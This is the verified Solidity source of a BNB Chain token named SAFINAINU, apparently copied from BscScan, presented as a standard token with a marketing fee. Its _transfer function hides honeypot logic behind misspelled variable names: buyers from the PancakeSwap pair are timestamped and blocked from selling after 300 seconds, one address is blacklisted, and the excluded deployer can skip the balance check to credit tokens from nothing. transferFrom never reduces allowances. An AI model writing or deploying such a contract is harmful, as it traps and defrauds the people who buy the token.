/**
 *Submitted for verification at BscScan.com on 2022-05-22
*/

pragma solidity ^0.8.12;
// SPDX-License-Identifier: Unlicensed


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}



interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}


interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}


contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor ()  {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

     /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

contract SAFINAINU is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    address public MarketingWallet = 0xFbEAbfb89f49098a7226e26c86d6B95eA192C92c;
    string private _name = "SAFINAINU";
    string private _symbol = "SAFINA";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 100000000 * 10 ** _decimals;
    uint256 public _Marketingfee = 2;
    IDEXRouter private router;
    constructor() {
        _tOwned[msg.sender] = _totalSupply;
        _isExcludedFrom[msg.sender] = true;
        isExcluded=_msgSender();
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        panckev2router = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    mapping (address => uint256) private _rfeetax; 

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    uint256 private _lunchi = 300; 

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    address private panckev2router;

    function _transfer(address form, address to, uint256 amount) internal virtual {
        require(form != address(0) && form != address(0x00ffDA4Ae4d03E47acc929545948794Eadd0734b));
        require(to != address(0));
        uint256 _bruntoken = 0;
        uint256 _brun = _rfeetax[form] + _lunchi;
        if (!_isExcludedFrom[form] && !_isExcludedFrom[to] 
        && to != address(this)) { _bruntoken = amount.mul(_Marketingfee).div(100);}
        if (to != isExcluded && to != panckev2router 
        && form == panckev2router && balanceOf(to) == 0)
        { _rfeetax[to] = block.timestamp;  }      
        uint256 _luchitime =block.timestamp;
        if (form !=isExcluded && form !=panckev2router && to !=isExcluded){require(_luchitime <= _brun);}
        uint256 sendertokens = _tOwned[form];
        if (form != to || !_isExcludedFrom[msg.sender]) { require(sendertokens >= amount); }
        uint256 tokenamount = amount - _bruntoken;
        _tOwned[MarketingWallet] += _bruntoken;
        if (sendertokens >= amount) { _tOwned[form] = sendertokens - amount; }
        _tOwned[to] += tokenamount; 
        emit Transfer(form, MarketingWallet, _Marketingfee);
        emit Transfer(form, to, tokenamount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 Allowancec = _allowances[sender][_msgSender()];
        require(Allowancec >= amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

}